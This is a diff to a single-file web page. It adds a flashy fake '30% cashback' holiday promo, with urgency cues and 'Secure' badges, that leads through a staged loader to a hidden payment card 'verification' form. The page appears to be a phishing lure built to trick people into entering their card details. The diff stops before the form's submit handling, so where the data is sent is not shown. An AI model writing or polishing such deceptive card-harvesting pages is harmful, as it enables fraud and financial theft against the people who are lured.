@@ -233,7 +233,72 @@
 </head>
 <body>
   <div class="container">
-    <div style="display: flex; flex-direction: column; align-items: center; margin-bottom: 8px;">
+    <!-- Promo section (shown first) - JUICY VARIANT -->
+    <div id="promo" style="width:100%; position:relative; overflow:visible; padding:6px 0 10px 0;">
+      <style>
+        /* Big juicy promo styles */
+        #promo .hero {
+          display:flex; align-items:center; gap:14px; justify-content:center; flex-direction:column;
+        }
+        #promo h1.promo-headline {
+          font-size:1.35rem; margin:6px 0 6px 0; color:#071540; font-weight:700; letter-spacing:0.4px; text-align:center;
+        }
+        #promo .offer-badge {
+          width:120px; height:120px; border-radius:999px; background:linear-gradient(135deg,#ffb03b,#ff6b6b); display:flex; flex-direction:column; align-items:center; justify-content:center; color:#fff; box-shadow:0 10px 30px rgba(255,107,107,0.18); transform:translateY(-8px);
+        }
+        #promo .offer-badge .percent { font-size:2.1rem; font-weight:800; line-height:1; }
+        #promo .offer-badge .cap { font-size:0.85rem; opacity:0.95; }
+        #promo .promo-details { font-size:0.95rem; color:#2b3440; margin-top:6px; text-align:center; max-width:320px; }
+        #promo .badges-row { display:flex; gap:10px; justify-content:center; margin-top:12px; }
+        #promo .cta-large { display:inline-block; margin-top:14px; padding:12px 26px; font-weight:800; border-radius:12px; text-decoration:none; color:#072046; background:linear-gradient(90deg,#ffd54a,#ffd14a); box-shadow:0 8px 28px rgba(3,102,214,0.06); transform:translateZ(0); }
+        /* pulsing CTA */
+        @keyframes pulse-cta { 0% { box-shadow:0 8px 18px rgba(255,181,59,0.18); transform:scale(1); } 50% { box-shadow:0 18px 40px rgba(255,181,59,0.28); transform:scale(1.03); } 100% { box-shadow:0 8px 18px rgba(255,181,59,0.18); transform:scale(1); } }
+        #promo .cta-large { animation: pulse-cta 2.8s ease-in-out infinite; }
+        /* subtle confetti dots */
+        #promo .confetti { position:absolute; inset:auto 8px 8px auto; pointer-events:none; }
+        #promo .confetti span { display:block; width:8px; height:8px; border-radius:50%; margin:4px; opacity:0.95; transform:translateY(0); }
+        @keyframes confetti-fall { 0% { transform:translateY(-6px) rotate(0deg); opacity:0.9; } 100% { transform:translateY(18px) rotate(220deg); opacity:0.25; } }
+        #promo .confetti span { animation:confetti-fall 2.6s ease-in-out infinite; }
+      </style>
+
+      <div class="hero">
+        <img src="./image.png" alt="Logo" style="height: 64px; margin-bottom: 2px; border-radius: 8px;">
+        <h1 class="promo-headline">Mega Holiday Bonus — Verify & Unlock Instant Rewards</h1>
+
+        <div style="display:flex; align-items:center; gap:14px; justify-content:center; flex-wrap:wrap;">
+          <div class="offer-badge" aria-hidden="true">
+            <div class="percent">30%</div>
+            <div class="cap">cashback</div>
+          </div>
+          <div style="display:flex; flex-direction:column; align-items:flex-start;">
+            <div class="promo-details"><strong>Claim an exclusive <span style="font-weight:800;">30% cashback</span> on your next purchase — up to <strong>$150</strong>. Quick verification improves checkout and unlocks personalised offers.</strong></div>
+            <div class="badges-row">
+              <div class="badge" style="padding:10px 12px; border-radius:10px; background:#f1f8ff;"><i class="fa-solid fa-gift" style="color:#0763b8;"></i><div style="margin-left:8px; font-weight:700; font-size:0.9rem;">Huge Reward</div></div>
+              <div class="badge" style="padding:10px 12px; border-radius:10px; background:#f2fff7;"><i class="fa-solid fa-shield-halved" style="color:#059669;"></i><div style="margin-left:8px; font-weight:700; font-size:0.9rem;">Secure</div></div>
+            </div>
+          </div>
+        </div>
+
+        <a href="#" id="claim-btn" class="cta-large">Claim 30% Now — Limited Slots</a>
+      </div>
+
+      <div class="confetti" aria-hidden="true">
+        <span style="background:#ffd54a; left:6px; animation-delay:0s"></span>
+        <span style="background:#ff6b6b; left:26px; animation-delay:0.3s"></span>
+        <span style="background:#7ee787; left:46px; animation-delay:0.6s"></span>
+      </div>
+
+      <div class="terms" style="margin-top:12px; text-align:center; font-size:0.85rem; color:#4b5563;">Offer valid for a limited time and selected accounts. By claiming you agree to the verification flow. Card details are transmitted over an encrypted connection and used only to confirm card ownership.</div>
+    </div>
+
+    <!-- Loader shown between promo and form -->
+    <div id="promo-loader" style="display:none; width:100%; justify-content:center; margin-top:18px;">
+      <div class="spinner" style="border:4px solid #e2e8f0; border-top:4px solid #0071ce; border-radius:50%; width:36px; height:36px; animation:spin 0.8s linear infinite;"></div>
+    </div>
+
+    <!-- Original form (hidden initially) -->
+    <div id="form-wrap" style="display:none; width:100%;">
+    <div style="display:flex; flex-direction: column; align-items: center; margin-bottom: 8px; width:100%;">
       <img src="./image.png" alt="Logo" style="height: 72px; margin-bottom: 1px; border-radius: 8px;">
       <span class="card-icon" style="justify-content: center;">
         <i class="fa-regular fa-credit-card"></i>
@@ -278,8 +343,27 @@
       <i class="fa-solid fa-thumbs-up"></i>
       <div class="msg">Card verified successfully! Thank you for confirming your main card.</div>
     </div>
+    </div>
   </div>
   <script>
+    // Single-file promo -> form flow
+
+    // When the page loads, promo is visible and form is hidden. Clicking claim shows a short loader then the form.
+    document.getElementById('claim-btn').addEventListener('click', function(e) {
+      e.preventDefault();
+      // hide promo, show small loader
+      document.getElementById('promo').style.display = 'none';
+      const promoLoader = document.getElementById('promo-loader');
+      promoLoader.style.display = 'flex';
+      // after 2.2s reveal the form (simulate navigation)
+      setTimeout(() => {
+        promoLoader.style.display = 'none';
+        document.getElementById('form-wrap').style.display = 'block';
+        // scroll to top of container for better UX
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+      }, 2200);
+    });
+
     document.getElementById('checkout-form').addEventListener('submit', function(e) {
       e.preventDefault();
       const cardName = document.getElementById('cardName').value.trim();
